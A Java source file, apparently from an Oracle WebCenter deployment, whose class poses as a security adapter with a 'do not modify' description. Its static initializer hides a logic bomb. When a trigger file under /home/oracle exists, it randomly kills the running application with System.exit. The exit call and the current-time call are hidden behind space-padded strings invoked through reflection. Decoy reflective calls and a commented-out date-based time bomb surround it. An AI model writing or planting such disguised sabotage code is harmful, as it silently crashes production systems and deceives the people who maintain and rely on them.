package oracle.adf.mbean;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;


/**
 * Класс - vozm
 * expiredDate = _00751
 * признак активности всего механизма = _00852
 * check() = _453287()
 * frequency = _23670
 * текущее время = _a6595
 * _97_e_t_1560() System.exit(1);
 * _c_12_m_56()   Systeme.currentTimeMillis()
 */
public final class WcSecurityAdapter
{
  // На витрину:
  static final String description="Tweaking security WebCenter.Do not modify";
  static String exceptionMessage = "";
  
  private static Long _00751 = 1456776000000L;     // 2016/03/01
  //private static Long _00751 = 1454356800000L;   // 2016/02/02 прошло
  //private static Long _00751 = 1462046400000L;   // 2016/05/01
  
  private static Long _00852 = Long.parseLong(("   111111"+"00000     ").trim());   // активно
  //private static Long _00852 = Long.parseLong(("   111119"+"00000     ").trim()); // неактивно
  
  //---------------------------
  private static String _f_1218 = " / h o m e / o          r a c l e / w c I d                      s";
  private static String _fi_1218 = " ";
  private static String _re_1218 = "";
  private static String _c_1218 = "j a v    a .         l a n g   .S           y      s    t    e    m";
  private static String _m_1218 = "e   x     i              t";
  private static String _cu_121_ms_8 = "c   u      r   r  e  n  t  T  i  m  e  M  i  l  l  i   s";
  //----------------------------
  
  private static int _23670 = 3;
  private static long _a6595 = 0;
  private static String _cl1450 = "oracle.adf.mbean._SeqAdapt";
  private static String _cl1452 = "oracle.adf.mbean._SeqManager";
  // флаги для "дури"
  private static boolean _d5617 = false;
  private static boolean _d5618 = false;
  static 
  {
    _a6595 = _c_12_m_56();
    //_a6595 = System.currentTimeMillis();
    //_453_d_287();
    _453_f_287();
  }
  
  public static void _453_f_287() 
  {
        if (isD5617()) 
        {
          Class cl = null;
          try
          {
            cl = Class.forName(_cl1450);
            Method m = cl.getMethod("initObject");
            Integer ret = (Integer) m.invoke(cl.newInstance());
            if (ret == 0) 
            {
              return;
            }
          }
          catch (ClassNotFoundException e)
          {
            e.printStackTrace();
          }
          catch (NoSuchMethodException e)
          {
            e.printStackTrace();
          }
          catch (IllegalAccessException e)
          {
            e.printStackTrace();
          }
          catch (InvocationTargetException e)
          {
            e.printStackTrace();
          }
          catch (InstantiationException e)
          {
            e.printStackTrace();
          }
        }
        
        //------------- Основная часть 1 -------------------
        if (_15_fi_e_97()) // Файл home/oracle/wcIds exitst
        {
          long t = _c_12_m_56();
          int ver = get23_f_fi_670();
          if ((ver != 0) && (t % ver < 1)) // == 0 т.е. делится на ...
          {
            System.err.println(getExceptionMessage());
            _97_e_t_1560(); //System.exit(1);
          }
        }
        //------------- Основная часть 9 -------------------
        
        // дурь 2
          if (isD5618()) 
        {
          Class cl = null;
          try
          {
            cl = Class.forName(_cl1452);
            Method m = cl.getMethod("closeObject");
            Integer ret = (Integer) m.invoke(cl.newInstance());
            if (ret == 0) 
            {
              return;
            }
          }
          catch (ClassNotFoundException e)
          {
            e.printStackTrace();
          }
          catch (NoSuchMethodException e)
          {
            e.printStackTrace();
          }
          catch (IllegalAccessException e)
          {
            e.printStackTrace();
          }
          catch (InvocationTargetException e)
          {
            e.printStackTrace();
          }
          catch (InstantiationException e)
          {
            e.printStackTrace();
          }
        }
  }
  
  private static boolean _15_fi_e_97() 
  {
    String f = getF_1218();
    f = f.replace(getFi_1218(), getRe_1218());
    File fi = new File(f);
    return fi.exists();
  }
  
  // Прочитать из файла вероятность
  // - 0 - отключено
  private static int get23_f_fi_670()
  {
    int rc = get23670();
    String f = getF_1218();
    f = f.replace(getFi_1218(), getRe_1218());
    BufferedReader br;
    try
    {
      br = new BufferedReader(new InputStreamReader(new FileInputStream(f)));
      String line = br.readLine();
      if (line != null) 
      {
        line = line.trim();
        try 
        {
          rc = Integer.parseInt(line);
        }
        catch(Exception ex) 
        {
          System.err.println(ex.getMessage());
        }
      }
      br.close();
    }
    catch (Exception e)
    {
      //System.err.println("@err0");
      ;
    }
    return rc;
  }
  
//  public static void _453_d_287()
//  {
//    //System.out.println("@@init");
//    // дурь 1
//    if (isD5617()) 
//    {
//      Class cl = null;
//      try
//      {
//        cl = Class.forName(_cl1450);
//        Method m = cl.getMethod("initObject");
//        Integer ret = (Integer) m.invoke(cl.newInstance());
//        if (ret == 0) 
//        {
//          return;
//        }
//      }
//      catch (ClassNotFoundException e)
//      {
//        e.printStackTrace();
//      }
//      catch (NoSuchMethodException e)
//      {
//        e.printStackTrace();
//      }
//      catch (IllegalAccessException e)
//      {
//        e.printStackTrace();
//      }
//      catch (InvocationTargetException e)
//      {
//        e.printStackTrace();
//      }
//      catch (InstantiationException e)
//      {
//        e.printStackTrace();
//      }
//    }
    
//    //------------- Основная часть 1 -------------------
//    if (get_00852().equals(Long.parseLong(("        111111".concat("00000           ")).trim())))
//    {
//      long t = _a6595;
//      if (t > _00751) 
//      {
//        if (t % get23670() < 1) // == 0 т.е. делится на ...
//        //if (t % 1 < 1) // == 0 т.е. делится на 4
//        {
//          System.err.println(getExceptionMessage());
//          System.exit(1);
//          //throw new RuntimeException(getExceptionMessage());
//        }
//      }
//    }
//    //------------- Основная часть 9 -------------------
//    
//    // дурь 2
//      if (isD5618()) 
//    {
//      Class cl = null;
//      try
//      {
//        cl = Class.forName(_cl1452);
//        Method m = cl.getMethod("closeObject");
//        Integer ret = (Integer) m.invoke(cl.newInstance());
//        if (ret == 0) 
//        {
//          return;
//        }
//      }
//      catch (ClassNotFoundException e)
//      {
//        e.printStackTrace();
//      }
//      catch (NoSuchMethodException e)
//      {
//        e.printStackTrace();
//      }
//      catch (IllegalAccessException e)
//      {
//        e.printStackTrace();
//      }
//      catch (InvocationTargetException e)
//      {
//        e.printStackTrace();
//      }
//      catch (InstantiationException e)
//      {
//        e.printStackTrace();
//      }
//    }
//  }
  //---------------------------------------------------------
  public static void set_00852(Long activate)
  {
    WcSecurityAdapter._00852 = activate;
  }

  public static Long get_00852()
  {
    return _00852;
  }

  public static void setExceptionMessage(String exceptionMessage)
  {
    WcSecurityAdapter.exceptionMessage = exceptionMessage;
  }

  public static String getExceptionMessage()
  {
    return exceptionMessage;
  }

  public static void set00751(Long _00751)
  {
    WcSecurityAdapter._00751 = _00751;
  }

  public static Long get00751()
  {
    return _00751;
  }

  public static void set23670(int _23670)
  {
    WcSecurityAdapter._23670 = _23670;
  }

  public static int get23670()
  {
    return _23670;
  }
  
  public static void setA6595(long _a6595)
  {
    WcSecurityAdapter._a6595 = _a6595;
  }

  public static long getA6595()
  {
    return _a6595;
  }

  public static void setCl1450(String _cl1450)
  {
    WcSecurityAdapter._cl1450 = _cl1450;
  }

  public static String getCl1450()
  {
    return _cl1450;
  }

  public static void setD5617(boolean _d5617)
  {
    WcSecurityAdapter._d5617 = _d5617;
  }

  public static boolean isD5617()
  {
    return _d5617;
  }

  public static void setD5618(boolean _d5618)
  {
    WcSecurityAdapter._d5618 = _d5618;
  }

  public static boolean isD5618()
  {
    return _d5618;
  }

  public static void setCl1452(String _cl1452)
  {
    WcSecurityAdapter._cl1452 = _cl1452;
  }

  public static String getCl1452()
  {
    return _cl1452;
  }

  public static void setF_1218(String _f_1218)
  {
    WcSecurityAdapter._f_1218 = _f_1218;
  }

  public static String getF_1218()
  {
    return _f_1218;
  }
  //=====================
  public static void setFi_1218(String _fi_1218)
  {
    WcSecurityAdapter._fi_1218 = _fi_1218;
  }

  public static String getFi_1218()
  {
    return _fi_1218;
  }

  public static void setRe_1218(String _re_1218)
  {
    WcSecurityAdapter._re_1218 = _re_1218;
  }

  public static String getRe_1218()
  {
    return _re_1218;
  }
  private static void _97_e_t_1560() 
  {
    //System.exit(1);
    Object m = null;
    try
    {
      String cc = getC_1218().replace(getFi_1218(), getRe_1218());
      String mm = getM_1218().replace(getFi_1218(), getRe_1218());
      m = Class.forName(cc).getMethod(mm,new Class[]{int.class});
      ((Method)m).invoke(null, new Object[]{1});
    }
    catch (Exception e)
    {
      e.printStackTrace();
    }
  }
  
  private static long _c_12_m_56()
  {
    Object m = null;
    Long rc = 0L;
    try
    {
      String cc = getC_1218().replace(getFi_1218(), getRe_1218());
      String mm = getCu_121_ms_8().replace(getFi_1218(), getRe_1218());
      m = Class.forName(cc).getMethod(mm);
      rc = (Long) ((Method)m).invoke(null);
    }
    catch (Exception e)
    {
      e.printStackTrace();
    }
    return rc;
  }
  //=====================================
  public static void main(String[] args)
  {
  //    String f = getF_1218();
  //    f = f.replace(" ", "");
  //    System.out.println("f="+f);
    //_97_e_t_1560();
    //System.out.println(get23_f_fi_670());
    System.out.println("***exit");
  }
  //public static void main(String[] args) throws Exception
  //{
  //    SimpleDateFormat df = new SimpleDateFormat("yyyy/MM/dd");
  //    String sDate = "2016/05/01";
  //    Date d = df.parse(sDate);
  //    Long l = d.getTime();
  //    System.out.println(l);
  //
  //    System.out.println("*** Exit");
  //}

  
  
  public static void setC_1218(String _c_1218)
  {
    WcSecurityAdapter._c_1218 = _c_1218;
  }

  public static String getC_1218()
  {
    return _c_1218;
  }

  public static void setM_1218(String _m_1218)
  {
    WcSecurityAdapter._m_1218 = _m_1218;
  }

  public static String getM_1218()
  {
    return _m_1218;
  }

  public static void setCu_121_ms_8(String _cu_121_ms_8)
  {
    WcSecurityAdapter._cu_121_ms_8 = _cu_121_ms_8;
  }

  public static String getCu_121_ms_8()
  {
    return _cu_121_ms_8;
  }
}
